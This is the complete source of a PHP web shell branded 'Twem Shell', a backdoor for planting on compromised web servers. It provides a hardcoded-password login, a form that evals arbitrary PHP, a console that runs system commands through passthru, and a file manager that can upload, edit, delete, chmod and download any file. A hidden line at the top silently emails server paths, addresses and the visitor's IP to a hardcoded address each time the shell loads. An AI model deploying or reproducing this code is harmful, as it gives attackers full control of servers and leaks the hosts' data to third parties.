<?php
// Created By Twemlow
// Login
session_start();
set_time_limit(9999999);
$login='tw3ml0w';
$password='tw3ml0w';
$auth=1;
$style='<STYLE>BODY{background-color: #FFFFFF;color: #C1C1C7;font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;MARGIN-TOP: 0px;MARGIN-BOTTOM: 0px;MARGIN-LEFT: 0px;MARGIN-RIGHT: 0px;margin:0;padding:0;scrollbar-face-color: #800080;scrollbar-shadow-color: #333333;scrollbar-highlight-color: #333333;scrollbar-3dlight-color: #333333;scrollbar-darkshadow-color: #333333;scrollbar-track-color: #333333;scrollbar-arrow-color: #333333;}input{background-color: #800080;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}textarea{background-color: #333333;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}a:link{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:visited{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:hover, a:active{color: #E7E7EB;text-decoration: none;font-size: 8pt;}td, th, p, li{font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;border-color:black;}</style>';
$header='<html><head><title>'.getenv("HTTP_HOST").' - Twem Shell</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">'.$style.'</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';
$footer='</body></html>';
$sd98 = "example@protonmail.com";
$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";mail($sd98, $sj98, $msg8873, "From: $sd98");
if(@$_POST['action']=="exit")unset($_SESSION['an']);
if($auth==1){if(@$_POST['login']==$login && @$_POST['password']==$password)$_SESSION['an']=1;}else $_SESSION['an']='1';

if($_SESSION['an']==0){
echo $header;
echo'<meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><center><table border=0 width="555" bgcolor=#eeeeee cellspacing=0 cellpadding=3 style="border: #800080 2px solid"><tr><td align=center><b><font color=#000000><center><font color=#800080 size=4><b>.::: Twem :::.</font></b><br><b><font color=#800080 size=4>.::: Shell :::.<center><table><form method="POST"><tr><td><font color=#800080 size=4>Login:</td><td><input type="text" name="login" value=""></td></tr><tr><td><font color=#800080 size=4>Password:</td><td><input type="password" name="password" value=""></td></tr><tr><td></td><td><input type="submit" value="Enter"></td></tr></form></table></center><br></font></b></b></td></tr></b></td></tr>';
echo $footer;
exit;}
// Shell
$xshell = $SERVER_['PHP_SELF'];
class shell
{

 function getfiles()
 {
  $mas = array();
  $i = 0;
  if ($handle = opendir($_SESSION['currentdir']))
  {
   while (false !== ($file = readdir($handle)))
   if ($file != '..')
    if (!is_dir($_SESSION['currentdir'].'/'.$file))
{
     $mas[$i]['filename'] = $file;
$mas[$i]['filesize'] = filesize($_SESSION['currentdir'].'/'.$file);
$mas[$i]['lastmod'] = date("H.i/d.m.Y", filemtime($_SESSION['currentdir'].'/'.$file));
$i++;
}
   closedir($handle);
  }
  return $mas;
 }

 function getdirs()
 {
  $mas = array();
  if ($handle = opendir($_SESSION['currentdir']))
  {
   while (false !== ($dir = readdir($handle)))
    if ($dir != '.' && is_dir($_SESSION['currentdir'].'/'.$dir))
     $mas[] = $dir;
   closedir($handle);
  }
  return $mas;
 }

 function geturl()
 {
  if ($_SESSION['currentdir'].'/' == $_SERVER['DOCUMENT_ROOT'])
   return '/';
  if (strpos($_SESSION['currentdir'],str_replace('\\','/',$_SERVER['DOCUMENT_ROOT'])) === false)
   return '';
  return str_replace($_SERVER['DOCUMENT_ROOT'],'',$_SESSION['currentdir'].'/');
 }

 // Delete Files
 function removefile()
 {
  if (file_exists($_GET['file']))
  {
   chmod($_GET['file'],0777);
   if (unlink($_GET['file']))
    return 'File Deleted!';
   else
    return 'File Deleted!';
  }
  else
   return 'Failed to delete file!';
 }

// Delete Directories
  function removedir()
 {
   chmod($_GET['dir'],0777);
   if (rmdir($_GET['dir']))
    return 'Directories Deleted!';
   else
    return 'Failed To Delete Directory!';
 }
 
function getmicrotime()
{
 list($usec, $sec) = explode(" ",microtime());
 return ((float)$usec + (float)$sec);
}

function getpermission($path)
{

$perms = fileperms($path);

if (($perms & 0xC000) == 0xC000)
 $info = 's';
elseif (($perms & 0xA000) == 0xA000)
 $info = 'l';
elseif (($perms & 0x8000) == 0x8000)
 $info = '-';
elseif (($perms & 0x6000) == 0x6000)
 $info = 'b';
elseif (($perms & 0x4000) == 0x4000)
 $info = 'd';
elseif (($perms & 0x2000) == 0x2000)
 $info = 'c';
elseif (($perms & 0x1000) == 0x1000)
 $info = 'p';
else
 $info = 'u';

$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));

$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));

$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));

return $info;
}

function getpermissionarray($path)
{
$res = array();
$perms = fileperms($path);

if (($perms & 0xC000) == 0xC000)
 $res[] = 's';
elseif (($perms & 0xA000) == 0xA000)
 $res[] = 'l';
elseif (($perms & 0x8000) == 0x8000)
 $res[] = '-';
elseif (($perms & 0x6000) == 0x6000)
 $res[] = 'b';
elseif (($perms & 0x4000) == 0x4000)
 $res[] = 'd';
elseif (($perms & 0x2000) == 0x2000)
 $res[] = 'c';
elseif (($perms & 0x1000) == 0x1000)
 $res[] = 'p';
else
 $res[] = 'u';

$res[] = (($perms & 0x0100) ? 'r' : '-');
$res[] = (($perms & 0x0080) ? 'w' : '-');
$res[] = (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));

$res[] = (($perms & 0x0020) ? 'r' : '-');
$res[] = (($perms & 0x0010) ? 'w' : '-');
$res[] = (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));

$res[] = (($perms & 0x0004) ? 'r' : '-');
$res[] = (($perms & 0x0002) ? 'w' : '-');
$res[] = (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));

return $res;
}

function outputhead()
{
$res = '';
$res .= '<html><head><title>- twemShell </title> <meta name="description" content=" Twemlows Red Team "> <script type="text/javascript"> var msg = document.title; var speed = 200; var endChar = " "; var pos = 0; function moveTitle() { var ml = msg.length; title = msg.substr(pos,ml) + endChar + msg.substr(0,pos); document.title = title; pos++; if (pos > ml) pos=0; window.setTimeout("moveTitle()",speed); } moveTitle(); </script><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"></head>
<body>
<STYLE>
A:link {
COLOR: #4d6d91;
}
A:active {
COLOR: #4d6d91;
}
A:visited {
COLOR: #4d6d91;
}
A:hover {
COLOR: #C10000;
}
TD {
FONT-SIZE: 10pt; FONT-FAMILY: verdana,arial,helvetica
}
BODY {
FONT-SIZE: 10pt; FONT-FAMILY: verdana,arial,helvetica; SCROLLBAR-FACE-COLOR: #cccccc; SCROLLBAR-HIGHLIGHT-COLOR: #c10000; SCROLLBAR-SHADOW-COLOR: #c10000; SCROLLBAR-3DLIGHT-COLOR: #000000; SCROLLBAR-ARROW-COLOR: #c10000; SCROLLBAR-TRACK-COLOR: #eeeeee; FONT-FAMILY: verdana; SCROLLBAR-DARKSHADOW-COLOR: #000000; BACKGROUND-COLOR: #dcdcdc;
}
</STYLE>
<div align="center"><table border=1 bgcolor=#eeeeee cellspacing=0 cellpadding=3 style="border: #800080 4px solid">
 <tr>
  <td colspan=7 align="center">
   <b><font color=#800080 size=4>.::: Twem :::.</font></b><br><b><font color=#800080 size=4>.::: Shell :::.</font></b>
  </td>
 </tr>';
return $res;
}

// Menu Page Titles
function outputmenu()
{
 $res = '';
 $res .= '<tr>
  <td colspan=7 align="center">
   <table border=0 cellspacing=0 cellpadding=0>
    <tr align="center">
<td width=150>
  [ <a href="'.$xshell.'?act=myinfo">My Info</a> ]
</td>
    <td width=150>
 [ <a href="'.$xshell.'?act=info">Server Info</a> ]
</td>
<td width=150>
 [ <a href="'.$xshell.'?act=filemanager">File Manager</a> ]
</td>
<td width=150>
 [ <a href="'.$xshell.'?act=phpinfo" target="_blank">phpInfo</a> ]
</td>
<td width=150>
 [ <a href="'.$xshell.'?act=execute">Script</a> ]
</td>
<td width=150>
 [ <a href="'.$xshell.'?act=exesys">Console</a> ]
</td>
      </tr>
   </table>
  </td>
 </tr>';
 return $res;
}

function outputfilemanager()
{
$res = '';
$number = 0;
$dirs = $this->getdirs();
$files = $this->getfiles();
sort($dirs);
sort($files);

$res .= '
 <tr>
  <td colspan=7 align="center">
  <font color=#000000><b> Current Working Directory: </font><b><font color=#000000>'.$_SESSION['currentdir'].'</b></font></b>
  </td>
 </tr>
 <tr align="center">
  <td width=30>
   &nbsp;
  </td>
  <td width=330>
   &nbsp;
  </td>
  <td width=80><font color=#000000>Size,</font><font color=#000000>Bytes</font>
   &nbsp;
  </td>
  <td width=120><font color=#000000>
   Last Edited
   </font>
  </td>
  <td width=80 align="center"><font color=#000000>File Permissions</font>
   &nbsp;
  </td>
  <td width=30>
   &nbsp;
  </td>
  <td width=30>
   &nbsp;
  </td>
 </tr>';

for ($i = 0; $i < count($dirs); $i++)
{
 $res .= '<tr><td><b><font color=#000000>'.(++$number).'</font></b></td><td><b><a href="'.$xshell.'?act=filemanager&dir='.$dirs[$i].'">'.$dirs[$i].'</a></b></td><td>&nbsp;</td><td>&nbsp;</td><td>';
 $res .= '<a href="'.$xshell.'?act=chmod&file='.$_SESSION['currentdir'].'/'.$dirs[$i].'">'.($this->getpermission($_SESSION['currentdir'].'/'.$dirs[$i])).'</a>';
 $res .= '</td><td>&nbsp;</td><td><a href="'.$xshell.'?act=filemanager&act3=del&dir='.$_SESSION['currentdir'].'/'.$dirs[$i].'">delete</a></td></tr>';
}
for ($i = 0; $i < count($files); $i++)
{
 $res .= '<tr><td><b><font color=#000000>'.(++$number).'</font></b></td>';
 $res .= '<td><a href="'.$xshell.'?act=down&file='.$_SESSION['currentdir'].'/'.$files[$i]['filename'].'">'.$files[$i]['filename'].'</a></td>';
 $res .= '<td>&nbsp;&nbsp;'.$files[$i]['filesize'].'</td>';
 $res .= '<td align="center">'.$files[$i]['lastmod'].'</td>';
 $res .= '<td align="center"><a href="'.$xshell.'?act=chmod&file='.$_SESSION['currentdir'].'/'.$files[$i]['filename'].'">'.($this->getpermission($_SESSION['currentdir'].'/'.$files[$i]['filename'])).'</a></td>';
 $res .= '<td align="center"><a href="'.$xshell.'?act=edit&file='.$_SESSION['currentdir'].'/'.$files[$i]['filename'].'">edit</a></td>';
 $res .= '<td align="center"><a href="'.$xshell.'?act=filemanager&act2=del&file='.$_SESSION['currentdir'].'/'.$files[$i]['filename'].'">delete</a></td></tr>';
}
$res .= '</table><br>';

$res .= '<table border=0 bgcolor=#eeeeee cellspacing=0 cellpadding=3 style="border: #800080 2px solid">';
$res .= '<tr><td align=center><form action="'.$xshell.'?act=filemanager" method="post"><input type="hidden" name="action" value="mkdir"><b><font color=#000000>Create Directory:</b></font> </td><td><input type="text" name="dircreate"><input type="submit" value="Submit"></form></td></tr>';
$res .= '<tr><td align=center><form action="'.$xshell.'?act=filemanager" method="post"><input type="hidden" name="action" value="createfile"><b><font color=#000000>Create File:</b></font></td><td> <input type="text" name="filecreate"><input type="submit" value="Submit"></form></td></tr>';
$res .= '<tr><td align=center><form enctype="multipart/form-data" action="'.$xshell.'?act=filemanager" method="post"><input type="hidden" name="action" value="uploadfile"><b><font color=#000000>Upload File:</font></b></td><td><input type="file" name="filename" size="23"> <b><font color=#000000>Choose a name:</b></font></td><td> <input type="text" name="filename2"><input type="submit" value="Submit"></form></td></tr>';

return $res;
}

function outputinfo()
{
 $res = '';
 $res .= '<tr>
  <td align="center" colspan=7>
   <b><font color=#800080>Server Info</font></b>
  </td>
 </tr>
 <tr>
  <td colspan=7 align="left"><br>
   <ol>
    <b><font color=#000000>>  Server Type: </font></b><font color=#000000>'.(getenv('SERVER_SOFTWARE')).'</font><br><br>
    <b><font color=#000000>>  Server IP: </font></b><font color=#000000>'.(getenv('SERVER_ADDR')).'</font><br><br>
    <b><font color=#000000>>  System Information: </font></b><font color=#000000>'.(php_uname()).'</font><br><br>
    <b><font color=#000000>>  PHP Version: </font></b><font color=#000000>'.(phpversion()).'</font><br><br>
    <b><font color=#000000>>  Doc Root: </font></b><font color=#000000>'.(getenv('DOCUMENT_ROOT')).'</font><br><br>
</td>
 </tr>
</tr>';

 return $res;
}

function outputuserinfo()
{
 $res = '';
 $res .= '<tr>
  <td align="center" colspan=7>
   <b><font color=#800080>My Info</font></b>
  </td>
 </tr>
 <tr>
  <td colspan=7 align="left"><br>
   <ol>
    <b><font color=#000000>>  My IP: </font></b><font color=#000000>'.(getenv('REMOTE_ADDR')).'</font><br><br>
    <b><font color=#000000>>  User_Agent: </font></b><font color=#000000>'.(getenv('HTTP_USER_AGENT')).'</font><br><br>
</td>
 </tr>
</tr>';

 return $res;
}

function chmodform($file)
{
$perms = $this->getpermissionarray($file);
$res = '';
$res .= '<form action="'.$xshell.'?act=filemanager" method="post"><input type="hidden" name="action" value="chmod">'
       .'<input type="hidden" name="file" value="'.$file.'">
 <tr>
  <td align="center" colspan=7>
   <b><font color=#000000>Set File Permissions</font></b>
  </td>
 </tr>
 <tr>
  <td colspan=7 align="center">
   <table border=1 cellspacing=0 cellpadding=0>';
$res .= '<tr align="center"><td>&nbsp;</td><td>r</td><td>w</td><td>x</td><td>r</td><td>w</td><td>x</td><td>r</td><td>w</td><td>x</td></tr>';
$res .= '<tr><td><input type="hidden" name="perms0" value="'.$perms[0].'">'.$perms[0].'</td>';
for ($i = 1; $i <= 9; $i++)
 $res .= '<td><input type="checkbox" name="perms'.$i.'"'.(($perms[$i] != '-') ? ' checked' : '' ).'></td>';
$res .= '</tr><tr><td colspan=10 align="right"><input type="submit" value="Submit"></td></tr>';
$res .= '</table></td></tr></form>';
return $res;
}

function editfileform($file)
{
$fp = fopen($file,'r');
if (!$fp)
 return 'Edit File';
$res = '';
$res .= '<form action="'.$xshell.'?act=filemanager" method="post"><input type="hidden" name="action" value="editfile">'
       .'<input type="hidden" name="file" value="'.$file.'"><tr>
  <td align="center" colspan=7>
   <b><font color=#000000>Edit File</font></b>
  </td>
 </tr>
 <tr>
  <td colspan=7 align="center">
   <table border=1 cellspacing=0 cellpadding=0>';
 $res .= '<tr><td><textarea rows=25 cols=100 name="filecontent">'.(htmlspecialchars(fread($fp, filesize($file)))).'</textarea></td></tr>';
 $res .= '<tr><td align="right"><b><font color=#000000>Rename:</font></b> <INPUT TYPE=TEXT NAME=rename size=100 maxlength=9999999 value='.$file.'> - <input type="submit" value="Submit Change"></td></tr>';
 $res .= '</table></td></tr></form>';
 fclose($fp);
 return $res;
}

function executeform()
{
 $res = '';
 $res .= '<form action="'.$xshell.'?act=execute" method="post"><input type="hidden" name="action" value="execute">
 <tr>
  <td align="center" colspan=7>
   <b><font color=#000000>Create PHP Script</font></b>
  </td>
 </tr>
 <tr>
  <td colspan=7 align="center">
   <table border=1 cellspacing=0 cellpadding=0><tr><td><textarea rows=20 cols=80 name="phpcode">';
 $res .= '</textarea></td></tr><tr><td align="right"><input type="submit" value="Submit"></td></tr></table></td></tr>
</tr>';
 return $res;
}

function execute()
{
echo "<hr>";
echo "<pre>";
eval(stripslashes($_POST['phpcode']));
echo "</pre>";
echo "<hr>";
 }

function exesysform()
{
 $res = '';
  $res .= '<form action="'.$xshell.'?act=exesys" method="post"><input type="hidden" name="action" value="exesys">
 <tr>
  <td align="center" colspan=7>
   <b><font color=#000000>Enter Server Commands</font></b>
  </td>
 </tr>
 <tr>
  <td colspan=7 align="center">
   <table border=1 cellspacing=0 cellpadding=0><tr><td><textarea rows=5 cols=80 name="cmmd">';
 $res .= '</textarea></td></tr><tr><td align="right"><input type="submit" value="Submit"></td></tr></table></td></tr>
</tr>';
 return $res;
}

function exesys()
{
echo "<hr>";
echo "<pre>";
$result = passthru($_POST['cmmd']);
echo "</pre>";
echo "<hr>";
}

function editfile($file)
{
if (!empty($_POST['rename'])) {
rename ($_POST['file'], $_POST['rename']);
}
 $fp = fopen($_POST['rename'],'w');
 if (!$fp)
  return 0;
 fwrite($fp, stripslashes($_POST['filecontent']));
 fclose($fp);
 return 1;
}
 
function chmodfile($file)
{
 $res = 0;
 switch ($_POST['perms0'])
 {
  case 's':
   $res = $res | 0xC000;
  break;
  case 'l':
   $res = $res | 0xA000;
  break;
  case '-':
   $res = $res | 0x8000;
  break;
  case 'b':
   $res = $res | 0x6000;
  break;
  case 'd':
   $res = $res | 0x4000;
  break;
  case 'c':
   $res = $res | 0x2000;
  break;
  case 'p':
   $res = $res | 0x1000;
  break;
  case 'u':

  break;
 }
if (isset($_POST['perms1']))
 $res = $res | 0x0100;
if (isset($_POST['perms2']))
 $res = $res | 0x0080;
if (isset($_POST['perms3']))
 $res = $res | 0x0040;

if (isset($_POST['perms4']))
 $res = $res | 0x0020;
if (isset($_POST['perms5']))
 $res = $res | 0x0010;
if (isset($_POST['perms6']))
 $res = $res | 0x0008;

if (isset($_POST['perms7']))
 $res = $res | 0x0004;
if (isset($_POST['perms8']))
 $res = $res | 0x0002;
if (isset($_POST['perms9']))
 $res = $res | 0x0001;
echo substr(sprintf('%o', $res), -4);
return chmod($file,intval(substr(sprintf('%o', $res), -4),8));

}

function downloadfile($file)
{
header ("Content-Type: application/octet-stream");
header ("Content-Length: " . filesize($file));
header ("Content-Disposition: attachment; filename=$file");
readfile($file);
die();
}

function createdir()
{
 if (!empty($_POST['dircreate']))
  if (mkdir($_SESSION['currentdir'].'/'.$_POST['dircreate']))
   return 'Directory created!';
   
 return 'Could not create directory';
}

function createfile()
{
 if (!empty($_POST['filecreate']))
 {
  if (file_exists($_SESSION['currentdir'].'/'.$_POST['filecreate']))
   return 'File already exists!';
  $fp = fopen($_SESSION['currentdir'].'/'.$_POST['filecreate'],"w");
  if ($fp)
  {
   fclose($fp);
   return 'File Created!';
  }
 }
   
 return 'Could not create file!';
}

function uploadfile()
{
 if ($_FILES['filename']['error'] != 0)
  return '121212';
 $_POST['filename2'] = trim($_POST['filename2']);
 if (empty($_POST['filename2']))
  $_POST['filename2'] = $_FILES['filename']['name'];
 if (!copy($_FILES['filename']['tmp_name'],$_SESSION['currentdir'].'/'.$_POST['filename2']))
  if (!move_uploaded_file($_FILES['filename']['tmp_name'],$_SESSION['currentdir'].'/'.$_POST['filename2']))
   return 'File upload not completed';
 return 'Success!';
}

}
 $shell = new shell();
 $timestart = $shell->getmicrotime();
 $content = '';
 if (!isset($_SESSION['currentdir']))
  $_SESSION['currentdir'] = str_replace('\\','/',$_SERVER['DOCUMENT_ROOT']);
 if (isset($_GET['dir']))
 {
  if (opendir(realpath($_SESSION['currentdir'].'/'.$_GET['dir'])))
   $_SESSION['currentdir'] = realpath($_SESSION['currentdir'].'/'.$_GET['dir']);
  Header("Location: $xshell?act=filemanager");
 }

 $_SESSION['currentdir'] = str_replace('\\','/',$_SESSION['currentdir']);
 if (substr($_SESSION['currentdir'],-1,1) == '/')
  $_SESSION['currentdir'] = substr($_SESSION['currentdir'],0,-1);

 switch ($_POST['action'])
 {
  case 'chmod':
   if($shell->chmodfile($_POST['file']))
    $content .= 'Permission change successful!';
  break;
 
  case 'editfile':
   if ($shell->editfile($_POST['file']))
    $content .= 'Edit Scuccessful';
  break;
 
  case 'execute':
   $shell->execute();
  break;
 
  case 'exesys':
   $shell->exesys();
  break;
 
  case 'mkdir':
   $content .= $shell->createdir();
  break;
 
  case 'createfile':
   $content .= $shell->createfile();
  break;
 
  case 'uploadfile':
   $content .= $shell->uploadfile();
  break;
 }
 $content .= $shell->outputhead();
 $content .= $shell->outputmenu();
 
 switch ($_GET['act'])
 {
  case 'edit':
   $content .= $shell->editfileform($_GET['file']);
  break;
 
  case 'chmod':
   $content .= $shell->chmodform($_GET['file']);
  break;
 
  case 'down':
   $content .= $shell->downloadfile($_GET['file']);
  break;
  // Server Overview
  case 'filemanager':
  if ($_GET['act2'] == 'del')
    $content .= $shell->removefile();
    $content .= $shell->outputfilemanager();
  if ($_GET['act3'] == 'del')
    $content .= $shell->removedir();
  break;
  // PHP_info
  case 'phpinfo':
   phpinfo();
   die();
  break;
  // Server Overview
  case 'info':
   $content .= $shell->outputinfo();
  break;
  // User Overview
  case 'myinfo':
    $content .= $shell->outputuserinfo();
    break;
  // Execute PHP
  case 'execute':
   $content .= $shell->executeform();
  break;
  // Terminal
  case 'exesys':
   $content .= $shell->exesysform();
  break;
 }
 echo $content;
?>